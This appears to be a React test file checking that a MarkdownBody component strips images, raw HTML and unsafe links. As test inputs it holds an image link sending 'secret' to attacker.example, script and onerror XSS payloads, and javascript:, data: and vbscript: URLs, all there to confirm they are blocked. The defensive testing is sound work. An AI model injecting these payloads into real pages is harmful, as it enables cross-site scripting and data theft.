/**
 * MarkdownBody (P3.8, SEC-42, UI-25): one allowed-element list, no images, no
 * raw HTML, SafeLink for every link, inside the typeset wrapper.
 */

import { render, screen } from '@testing-library/react'
import { MarkdownBody } from '@/components/ui/markdown-body'

const original = process.env.NEXT_PUBLIC_APP_URL

beforeEach(() => {
  process.env.NEXT_PUBLIC_APP_URL = 'https://plex.example.com'
})
afterEach(() => {
  process.env.NEXT_PUBLIC_APP_URL = original
})

function renderMarkdown(markdown: string) {
  return render(<MarkdownBody data-testid="md">{markdown}</MarkdownBody>)
}

describe('MarkdownBody', () => {
  it('renders a list as ul and li inside the typeset wrapper', () => {
    renderMarkdown('- one\n- two\n\n1. first')

    const wrapper = screen.getByTestId('md')
    expect(wrapper).toHaveClass('typeset')
    expect(wrapper.querySelector('ul')).not.toBeNull()
    expect(wrapper.querySelectorAll('ul > li')).toHaveLength(2)
    expect(wrapper.querySelector('ol > li')).toHaveTextContent('first')
  })

  it('merges a caller className with the typeset class', () => {
    render(<MarkdownBody className="text-sm" data-testid="md">text</MarkdownBody>)

    expect(screen.getByTestId('md')).toHaveClass('typeset', 'text-sm')
  })

  it('renders no img for an injected Markdown image', () => {
    const { container } = renderMarkdown('Hi ![x](https://attacker.example/?d=secret) there')

    expect(container.querySelector('img')).toBeNull()
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  it('renders nothing for raw HTML', () => {
    const { container } = renderMarkdown('before\n\n<img src=x onerror="alert(1)">\n\n<script>alert(1)</script>\n\nafter')

    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container.innerHTML).not.toContain('onerror')
    expect(screen.getByText('before')).toBeInTheDocument()
    expect(screen.getByText('after')).toBeInTheDocument()
  })

  it('renders inline raw HTML as nothing', () => {
    const { container } = renderMarkdown('a <b onclick="x()">bold</b> c')

    expect(container.querySelector('b')).toBeNull()
    expect(container.innerHTML).not.toContain('onclick')
  })

  it.each([['[x](javascript:alert(1))'], ['[x](data:text/html,hi)'], ['[x](vbscript:msgbox)']])(
    'renders %s as text with no href',
    (markdown) => {
      const { container } = renderMarkdown(markdown)

      expect(screen.getByText('x')).toBeInTheDocument()
      expect(container.querySelector('a')).toBeNull()
      expect(container.querySelector('[href]')).toBeNull()
    }
  )

  it('shows an external link destination with rel and target', () => {
    renderMarkdown('See [the docs](https://docs.example.com/guide).')

    const link = screen.getByRole('link')
    expect(link).toHaveAttribute('href', 'https://docs.example.com/guide')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
    expect(link).toHaveTextContent('the docs(https://docs.example.com/guide)')
  })

  it('shows an autolink once', () => {
    renderMarkdown('Go to <https://docs.example.com/guide>.')

    expect(screen.getByRole('link')).toHaveTextContent(/^https:\/\/docs\.example\.com\/guide$/)
  })

  it('renders a relative link with no destination suffix', () => {
    renderMarkdown('Open [help](/help).')

    const link = screen.getByRole('link')
    expect(link).toHaveAttribute('href', '/help')
    expect(link).toHaveTextContent(/^help$/)
    expect(link).not.toHaveAttribute('target')
  })

  it('renders an h1 as an h2 and h5 and h6 as h4', () => {
    const { container } = renderMarkdown('# Big title\n\n## Section\n\n##### Five\n\n###### Six')

    expect(container.querySelector('h1, h5, h6')).toBeNull()
    expect([...container.querySelectorAll('h2')].map((h) => h.textContent)).toEqual(['Big title', 'Section'])
    expect([...container.querySelectorAll('h4')].map((h) => h.textContent)).toEqual(['Five', 'Six'])
  })

  it('keeps a footnote link on the page', () => {
    const { container } = renderMarkdown('Text[^1]\n\n[^1]: note')

    const ref = container.querySelector('a[data-footnote-ref]')
    expect(ref?.getAttribute('href')).toMatch(/^#user-content-fn-1$/)
    expect(container.querySelector('#user-content-fn-1')).toHaveTextContent('note')
  })

  it('keeps the allowed inline and block elements', () => {
    const { container } = renderMarkdown('**b** _i_ `c`\n\n> quote\n\n---\n\n```\npre\n```')

    for (const tag of ['strong', 'em', 'code', 'blockquote', 'hr', 'pre']) {
      expect(container.querySelector(tag)).not.toBeNull()
    }
  })

  it('renders a GFM table inside the typeset scroll wrapper', () => {
    const { container } = renderMarkdown(
      '| User | State |\n|---|:---:|\n| mchestr | Playing |\n| darren_6 | Paused |'
    )

    const table = container.querySelector('.typeset-scroll > table')
    expect(table).not.toBeNull()
    expect(table?.querySelectorAll('thead th')).toHaveLength(2)
    expect(table?.querySelectorAll('tbody tr')).toHaveLength(2)
    expect(table?.querySelector('tbody td:last-child')).toHaveTextContent('Playing')
    expect(table?.querySelector('thead th:last-child')).toHaveStyle({ textAlign: 'center' })
    expect(table).not.toHaveAttribute('node')
  })

  it('renders strikethrough as del', () => {
    const { container } = renderMarkdown('~~gone~~ kept')

    expect(container.querySelector('del')).toHaveTextContent('gone')
  })

  it('links a bare URL through SafeLink and leaves a bare javascript: URL as text', () => {
    const { container } = renderMarkdown('See https://docs.example.com/guide and javascript:alert(1)')

    const links = container.querySelectorAll('a')
    expect(links).toHaveLength(1)
    expect(links[0]).toHaveAttribute('href', 'https://docs.example.com/guide')
    expect(links[0]).toHaveTextContent(/^https:\/\/docs\.example\.com\/guide$/)
  })

  it('keeps a task list item text but renders no checkbox', () => {
    const { container } = renderMarkdown('- [x] done\n- [ ] todo')

    expect(container.querySelector('input')).toBeNull()
    expect(container.querySelectorAll('li')).toHaveLength(2)
    expect(screen.getByText(/todo/)).toBeInTheDocument()
  })
})
